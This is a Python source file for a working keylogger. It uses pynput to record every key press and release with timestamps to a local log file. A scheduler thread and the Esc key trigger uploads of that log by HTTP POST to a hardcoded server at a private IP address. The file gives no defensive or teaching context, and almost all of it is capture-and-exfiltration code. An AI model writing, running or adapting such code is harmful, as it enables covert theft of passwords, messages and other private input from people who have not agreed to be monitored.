import datetime
import logging
import os
import threading
import time
import requests
from pynput import keyboard
import schedule

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
UPLOAD_URL = "http://192.168.122.1:5000/upload"

logging.basicConfig(level=logging.INFO)

_log_file_handle = None
# Guards the log file handle + file, since callbacks and the scheduler
# thread touch it from two different threads.
_file_lock = threading.Lock()
_stop_event = threading.Event()  # lets us cleanly shut down the schedule loop


def _get_log_handle():
    global _log_file_handle
    if _log_file_handle is None or _log_file_handle.closed:
        _log_file_handle = open(LOG_FILE, "a", encoding="utf-8")
    return _log_file_handle


def write_log(text):
    with _file_lock:
        try:
            handle = _get_log_handle()
            handle.write(text)
            handle.flush()
        except OSError as e:
            print(f"Log write failed: {e}")


def _fmt_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key}]"


def on_press(key):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"{ts} PRESS   {_fmt_key(key)}\n")


def on_release(key):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    write_log(f"{ts} RELEASE {_fmt_key(key)}\n")

    if key == keyboard.Key.esc:
        upload_log()
        return False  # stop listener


def upload_log():
    """Send the log to the server. Runs on the schedule thread or Esc callback."""
    global _log_file_handle
    with _file_lock:
        if _log_file_handle is not None and not _log_file_handle.closed:
            try:
                _log_file_handle.close()
            except OSError:
                pass
            _log_file_handle = None

        if not os.path.exists(LOG_FILE) or not UPLOAD_URL:
            return
        try:
            with open(LOG_FILE, "rb") as f:
                files = {"file": (LOG_FILE, f, "text/plain")}
                response = requests.post(UPLOAD_URL, files=files, timeout=10)
                print(f"Upload status: {response.status_code}")
        except Exception as e:
            print(f"Upload failed: {e}")


def _schedule_loop():
    """The manual equivalent of BackgroundScheduler — runs on its own thread."""
    while not _stop_event.is_set():
        schedule.run_pending()
        # Wait up to 1s, but wake immediately if _stop_event is set.
        _stop_event.wait(timeout=1)


def start_logger():
    """Starts the keyboard listener and the 30-min upload job."""
    # 1) Register the job and start the schedule loop on a daemon thread.
    schedule.every(30).minutes.do(upload_log)
    scheduler_thread = threading.Thread(target=_schedule_loop, daemon=True)
    scheduler_thread.start()

    # 2) Start the keyboard listener. listener.join() blocks THIS thread,
    #    but the schedule thread and pynput's own thread keep running.
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    finally:
        _stop_event.set()           # tell the schedule loop to exit
        scheduler_thread.join(timeout=2)